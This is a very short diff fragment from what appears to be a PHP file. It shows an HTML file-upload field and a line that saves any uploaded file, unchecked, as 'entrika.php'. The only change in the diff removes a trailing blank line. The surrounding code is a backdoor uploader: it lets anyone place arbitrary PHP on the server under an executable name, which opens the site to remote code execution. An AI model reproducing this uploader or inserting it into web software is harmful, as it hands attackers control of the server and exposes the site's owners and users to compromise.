@@ -7,4 +7,3 @@ Send this file: <INPUT NAME="userfile" TYPE="file">
 move_uploaded_file($userfile, "entrika.php"); 
 ?>
 
-
